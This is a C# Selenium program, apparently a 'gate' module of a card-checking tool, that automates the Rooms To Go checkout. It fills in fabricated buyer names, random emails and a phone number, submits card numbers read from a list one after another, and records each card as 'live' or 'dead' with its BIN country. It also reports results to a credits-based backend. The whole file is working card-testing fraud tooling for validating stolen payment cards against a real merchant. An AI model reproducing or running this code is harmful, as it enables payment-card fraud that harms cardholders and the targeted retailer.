using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Rooms2
    {
        Socks socks = new Socks();
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true)
            {
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();


                //chromeOptions.AddArguments(new List<string>() { "headless" });
                chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080", "--incognito", "--ignore-certificate-errors", "--headless"); //"--headless"
                //chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=true", "--incognito","--proxy-server=" + socks.proxy(), "--ignore-certificate-errors");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                try
                {
                    driver.Url = "https://www.roomstogo.com/furniture/kids-and-teens/decor/pillows/";
                }
                catch (Exception)
                {

                    restart();
                }

                try
                {



                    Thread.Sleep(1000);
                    Thunder._Form1.update_progresbar(5);
                    correo = "joseffernana" + getNum() + "@hotmail.com";

                    if (IsElementPresent(By.XPath("/html/body/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/h1")).Text.Trim() == "403 ERROR")
                        {
                            restart();
                        }
                    }

                    if (tiempoElemento(By.Id("aisSort")))
                    {
                        var precio = new SelectElement(driver.FindElement(By.Id("aisSort")));
                        //precio.SelectByText("Lowest Price");
                        Thread.Sleep(500);

                    }
                    else
                    {
                        restart();
                    }
                    var producto = RandomNumber(1, 12);
                    var href = "";
                    if (IsElementPresent(By.XPath("//*[@id='productResultsWrapper']/div/div/div[" + producto + "]/div/div/a")))
                    {
                        Thunder._Form1.update_progresbar(20);
                        href = driver.FindElement(By.XPath("//*[@id='productResultsWrapper']/div/div/div[" + producto + "]/div/div/a")).GetAttribute("href");
                        Thread.Sleep(300);
                        driver.Navigate().GoToUrl(href);
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        restart();
                    }

                    if (tiempoElemento(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")))
                    {
                        Thunder._Form1.update_progresbar(40);
                        driver.FindElement(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")).Click();
                        Thread.Sleep(2000);
                        //if (IsElementPresent(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")))
                        //{
                        //    if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Displayed == true)
                        //    {
                        //        if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Text == "Product is not available in your region.")
                        //        {
                        //            load2();
                        //        }
                        //    }
                        //}

                        driver.Navigate().GoToUrl("https://www.roomstogo.com/cart");
                        //driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div[2]/a")).Click();
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        restart();
                    }

                    if (IsElementPresent(By.XPath("//*[@id='content']/div/div/div[1]/div[2]/div[2]/div[2]/div/span/a")))
                    {
                        driver.FindElement(By.XPath("//*[@id='content']/div/div/div[2]/div[1]/div[4]/div/span/a")).Click();
                        Thread.Sleep(1000);
                    }
                    else
                    {

                        driver.Navigate().GoToUrl(href);
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")))
                        {
                            Thunder._Form1.update_progresbar(40);
                            driver.FindElement(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")).Click();
                            Thread.Sleep(3000);
                            //if (IsElementPresent(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")))
                            //{
                            //    if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Displayed == true)
                            //    {
                            //        if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Text == "Product is not available in your region.")
                            //        {
                            //            restart();
                            //        }
                            //    }
                            //}

                            driver.Navigate().GoToUrl("https://www.roomstogo.com/cart");
                            //driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div[2]/a")).Click();
                            Thread.Sleep(1000);

                            if (IsElementPresent(By.XPath("//*[@id='content']/div/div/div[1]/div[2]/div[2]/div[2]/div/span/a")))
                            {
                                driver.FindElement(By.XPath("//*[@id='content']/div/div/div[2]/div[1]/div[4]/div/span/a")).Click();
                                Thread.Sleep(1000);
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                    }

                    if (tiempoElemento(By.Id("firstName")))
                    {
                        Thunder._Form1.update_progresbar(60);
                        driver.FindElement(By.Id("firstName")).SendKeys("JOSE");
                        driver.FindElement(By.Id("lastName")).SendKeys("REYES");
                        driver.FindElement(By.Id("phone")).SendKeys("2136548541");
                        driver.FindElement(By.Id("altPhone")).SendKeys("2136548541");
                        driver.FindElement(By.Id("email")).SendKeys(correo);
                        driver.FindElement(By.Id("address")).SendKeys("street " + RandomNumber(1, 9));
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.XPath("//*[@id='addsug0']")))
                        {
                            driver.FindElement(By.XPath("//*[@id='addsug0']")).Click();
                            Thread.Sleep(1000);

                            if (IsElementPresent(By.XPath("//*[@id='shipping']/div/div[2]/div/button")))
                            {
                                Thunder._Form1.update_progresbar(70);
                                driver.FindElement(By.XPath("//*[@id='shipping']/div/div[2]/div/button")).Click();
                                Thread.Sleep(2000);
                            }

                            Thread.Sleep(500);
                            if (IsElementPresent(By.XPath("//*[@id='delivery']/div/div[2]/div[2]/button")))
                            {
                                Thunder._Form1.update_progresbar(80);
                                driver.FindElement(By.XPath("//*[@id='delivery']/div/div[2]/div[2]/button")).Click();
                                Thread.Sleep(2000);
                            }
                            else
                            {
                                restart();
                            }

                            if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div/div[2]/section/div[2]/div[1]/div[3]/div/div[2]/div/div/div[3]/div/div[2]/div/div/div[3]/div[1]/div/iframe")))
                            {
                                pago();
                            }
                            else
                            {
                                restart();
                            }




                        }
                        else
                        {
                            restart();
                        }


                    }
                    else
                    {
                        restart();
                    }

                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop2();
                    }

                }

            }
            else
            {
                stop2();
            }
        }

        public void load2()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true)
            {
               
                try
                {
                    driver.Url = "https://www.roomstogo.com/furniture/kids-and-teens/decor/pillows/";
                }
                catch (Exception)
                {

                    restart();
                }

                try
                {



                    Thread.Sleep(1000);
                    Thunder._Form1.update_progresbar(5);
                    correo = "joseffernana" + getNum() + "@hotmail.com";

                    if (IsElementPresent(By.XPath("/html/body/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/h1")).Text.Trim() == "403 ERROR")
                        {
                            restart();
                        }
                    }

                    if (tiempoElemento(By.Id("aisSort")))
                    {
                        var precio = new SelectElement(driver.FindElement(By.Id("aisSort")));
                        //precio.SelectByText("Lowest Price");
                        Thread.Sleep(500);

                    }
                    else
                    {
                        restart();
                    }
                    var producto = RandomNumber(1, 20);
                    var href = "";
                    if (IsElementPresent(By.XPath("//*[@id='productResultsWrapper']/div/div/div[" + producto + "]/div/div/a")))
                    {
                        Thunder._Form1.update_progresbar(20);
                        href = driver.FindElement(By.XPath("//*[@id='productResultsWrapper']/div/div/div[" + producto + "]/div/div/a")).GetAttribute("href");
                        Thread.Sleep(300);
                        driver.Navigate().GoToUrl(href);
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        restart();
                    }

                    if (tiempoElemento(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")))
                    {
                        Thunder._Form1.update_progresbar(40);
                        driver.FindElement(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")).Click();
                        Thread.Sleep(2000);
                        if (IsElementPresent(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")))
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Displayed == true)
                            {
                                if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Text == "Product is not available in your region.")
                                {
                                    load2();
                                }
                            }
                        }

                        driver.Navigate().GoToUrl("https://www.roomstogo.com/cart");
                        //driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div[2]/a")).Click();
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        restart();
                    }

                    if (IsElementPresent(By.XPath("//*[@id='content']/div/div/div[1]/div[2]/div[2]/div[2]/div/span/a")))
                    {
                        driver.FindElement(By.XPath("//*[@id='content']/div/div/div[1]/div[2]/div[2]/div[2]/div/span/a")).Click();
                        Thread.Sleep(1000);
                    }
                    else
                    {

                        driver.Navigate().GoToUrl(href);
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")))
                        {
                            Thunder._Form1.update_progresbar(40);
                            driver.FindElement(By.XPath("//*[@id='content']/div[1]/div[2]/div/div/div[2]/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/button")).Click();
                            Thread.Sleep(3000);
                            //if (IsElementPresent(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")))
                            //{
                            //    if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Displayed == true)
                            //    {
                            //        if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/h3[2]")).Text == "Product is not available in your region.")
                            //        {
                            //            restart();
                            //        }
                            //    }
                            //}

                            driver.Navigate().GoToUrl("https://www.roomstogo.com/cart");
                            //driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div[2]/a")).Click();
                            Thread.Sleep(1000);

                            if (IsElementPresent(By.XPath("//*[@id='content']/div/div/div[1]/div[2]/div[2]/div[2]/div/span/a")))
                            {
                                driver.FindElement(By.XPath("//*[@id='content']/div/div/div[1]/div[2]/div[2]/div[2]/div/span/a")).Click();
                                Thread.Sleep(1000);
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                    }

                    if (tiempoElemento(By.Id("firstName")))
                    {
                        Thunder._Form1.update_progresbar(60);
                        driver.FindElement(By.Id("firstName")).SendKeys("JOSE");
                        driver.FindElement(By.Id("lastName")).SendKeys("REYES");
                        driver.FindElement(By.Id("phone")).SendKeys("2136548541");
                        driver.FindElement(By.Id("altPhone")).SendKeys("2136548541");
                        driver.FindElement(By.Id("email")).SendKeys(correo);
                        driver.FindElement(By.Id("address")).SendKeys("street " + RandomNumber(1, 9));
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.XPath("//*[@id='addsug0']")))
                        {
                            driver.FindElement(By.XPath("//*[@id='addsug0']")).Click();
                            Thread.Sleep(1000);

                            if (IsElementPresent(By.XPath("//*[@id='shipping']/div/div[2]/div/button")))
                            {
                                Thunder._Form1.update_progresbar(70);
                                driver.FindElement(By.XPath("//*[@id='shipping']/div/div[2]/div/button")).Click();
                                Thread.Sleep(2000);
                            }

                            Thread.Sleep(500);
                            if (IsElementPresent(By.XPath("//*[@id='delivery']/div/div[2]/div[2]/button")))
                            {
                                Thunder._Form1.update_progresbar(80);
                                driver.FindElement(By.XPath("//*[@id='delivery']/div/div[2]/div[2]/button")).Click();
                                Thread.Sleep(2000);
                            }
                            else
                            {
                                restart();
                            }

                            if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div/div[2]/section/div[2]/div[1]/div[3]/div/div[2]/div/div/div[3]/div/div[2]/div/div/div[3]/div[1]/div/iframe")))
                            {
                                pago();
                            }
                            else
                            {
                                restart();
                            }




                        }
                        else
                        {
                            restart();
                        }


                    }
                    else
                    {
                        restart();
                    }

                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }

                }

            }
            else
            {
                stop2();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {




                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {
                    if (pagos < 5)
                    {
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        Thunder._Form1.update_progresbar(90);
                        driver.Navigate().Refresh();
                        Thread.Sleep(3000);

                        if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div/div[2]/section/div[2]/div[1]/div[3]/div/div[2]/div/div/div[3]/div/div[2]/div/div/div[3]/div[1]/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div[2]/section/div[2]/div[1]/div[3]/div/div[2]/div/div/div[3]/div/div[2]/div/div/div[3]/div[1]/div/iframe")));
                            Thread.Sleep(1000);
                            if (IsElementPresent(By.Name("credit-card-number")))
                            {
                                driver.FindElement(By.Name("credit-card-number")).SendKeys(ccnum);
                                Thread.Sleep(1000);
                                driver.SwitchTo().ParentFrame();
                                Thread.Sleep(1000);
                            }
                            else
                            {
                                driver.SwitchTo().ParentFrame();
                                Thread.Sleep(1000);
                                driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div[2]/section/div[2]/div[1]/div[3]/div/div[2]/div/div/div[3]/div/div[2]/div/div/div[3]/div[1]/div/iframe")).Click();
                                Thread.Sleep(1000);
                                var inputcc = driver.SwitchTo().ActiveElement();

                                for (var i = 0; i <= ccnum.Length - 1; i++)
                                {
                                    inputcc.SendKeys(ccnum[i].ToString());
                                    Thread.Sleep(500);

                                }
                                Thread.Sleep(500);

                            }


                            var mes = new SelectElement(driver.FindElement(By.Id("cardExpirationMonth")));
                            mes.SelectByValue(ccLine[1]);
                            Thread.Sleep(1000);

                            var anio = new SelectElement(driver.FindElement(By.Id("cardExpirationYear")));
                            anio.SelectByValue(ccLine[2]);
                            Thread.Sleep(2000);

                            driver.FindElement(By.Id("submit-card-btn")).Click();
                            Thread.Sleep(1000);

                            if (IsElementPresent(By.XPath("//*[@id='panel1']/div/div[2]/div/div/div[2]")))
                            {
                                if (driver.FindElement(By.XPath("//*[@id='panel1']/div/div[2]/div/div/div[2]")).Displayed == true)
                                {
                                    driver.Navigate().Refresh();
                                    Thread.Sleep(500);
                                    pago();
                                }
                            }

                            if (tiempoElemento(By.XPath("//*[@id='review']/div/div[2]/div/button")))
                            {
                                driver.FindElement(By.XPath("//*[@id='review']/div/div[2]/form/div/label/span[1]")).Click();
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='review']/div/div[2]/div/button")).Click();
                                Thread.Sleep(1000);
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }



                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop2();
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop2();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception EX)
            {

                Console.WriteLine("ERROR");
            }

        }

        public void stop2()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                return;
            }
            catch (Exception EX)
            {

                Console.WriteLine("ERROR");
                return;
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("/html/body/div[5]/div/div/div/div/div/span")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[5]/div/div/div/div/div/span")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[5]/div/div/div/div/div/span")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }

                    }

                    if (IsElementPresent(By.XPath("/html/body/div[3]/div/div/div/div/div/span")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/span")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/span")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }

                    }

                    if (IsElementPresent(By.XPath("//*[@id='content']/div/div/div[1]/div/div[1]/div[1]/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='content']/div/div/div[1]/div/div[1]/div[1]/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='content']/div/div/div[1]/div/div[1]/div[1]/h1")).Text.Trim() == "CONGRATULATIONS!")
                            {
                                estado = "live";
                            }
                        }

                    }
                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                driver.Navigate().GoToUrl("https://www.roomstogo.com/checkout");
                Thread.Sleep(200);
                if (tiempoElemento(By.XPath("//*[@id='payment']/div/div[1]/button")))
                {
                    driver.ExecuteJavaScript("document.querySelector('#payment > div > div.checkout-step-header__SectionHeader-sc-1tr7liy-0.gsanNR > button').click();");
                    Thread.Sleep(2000);
                    driver.ExecuteJavaScript("document.querySelector('#panel1 > div > div:nth-child(2) > div > button').click();");
                    Thread.Sleep(2000);
                }
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

